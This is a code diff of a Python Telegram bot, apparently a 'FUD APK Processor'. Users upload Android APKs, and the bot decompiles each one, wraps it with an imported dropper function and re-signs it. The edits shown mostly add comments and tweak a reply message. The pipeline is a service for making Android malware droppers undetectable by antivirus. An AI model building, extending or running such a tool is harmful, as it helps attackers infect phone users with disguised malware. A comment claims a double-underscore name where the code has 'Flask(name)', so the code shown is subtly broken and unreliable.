@@ -16,6 +16,7 @@ from dropper import wrap_as_dropper
 from signer import sign_apk
 from config import BOT_TOKEN, WORK_DIR
 
+# ---------- FUD Pipeline ----------
 def full_fud_pipeline(input_apk: str, output_apk: str, session_dir: str) -> str:
     decompiled_dir = os.path.join(session_dir, "decompiled")
     decompile(input_apk, decompiled_dir)
@@ -30,7 +31,8 @@ def full_fud_pipeline(input_apk: str, output_apk: str, session_dir: str) -> str:
     sign_apk(dropped_apk, output_apk)
     return output_apk
 
-# ✅ यहाँ name सही है (दो अंडरस्कोर)
+# ---------- Flask Server ----------
+# ✅ ध्यान दो: यहाँ name है, name नहीं!
 flask_app = Flask(name)
 
 @flask_app.route('/')
@@ -44,16 +46,19 @@ def run_flask():
 def start_flask():
     threading.Thread(target=run_flask).start()
 
+# ---------- Telegram Bot ----------
 async def handle_apk(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    # /start कमांड
     if update.message.text and update.message.text.startswith('/start'):
         await update.message.reply_text(
             "🤖 *FUD APK Processor Bot*\n\n"
-            "Send me an APK file and I'll process it.\n\n"
+            "Send me an APK file and I'll process it.\n"
             "📤 Just send any APK file!",
             parse_mode='Markdown'
         )
         return
     
+    # APK file handle
     doc = update.message.document
     if not doc or not doc.file_name.endswith(".apk"):
         await update.message.reply_text("❌ Please send a valid APK file.")
@@ -79,6 +84,7 @@ async def handle_apk(update: Update, context: ContextTypes.DEFAULT_TYPE):
     finally:
         shutil.rmtree(session_dir, ignore_errors=True)
 
+# ---------- Main ----------
 def main():
     os.makedirs(WORK_DIR, exist_ok=True)
     start_flask()
